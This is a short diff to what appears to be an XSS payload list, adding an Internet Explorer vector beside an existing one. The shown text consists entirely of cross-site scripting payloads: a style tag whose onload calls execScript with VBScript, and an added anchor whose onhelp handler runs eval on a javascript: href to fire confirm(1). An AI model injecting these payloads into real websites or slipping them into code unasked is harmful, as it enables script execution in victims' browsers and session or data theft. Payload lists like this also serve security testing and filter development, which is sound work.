@@ -32,3 +32,4 @@ XSS:
 
 IE vektor :
 <style onload='execScript("InputBox+1","VbScript");'>
+<a onhelp='eval(href+"confirm(1)")'contenteditable='true'href='&#32;javascript:'>click</a>
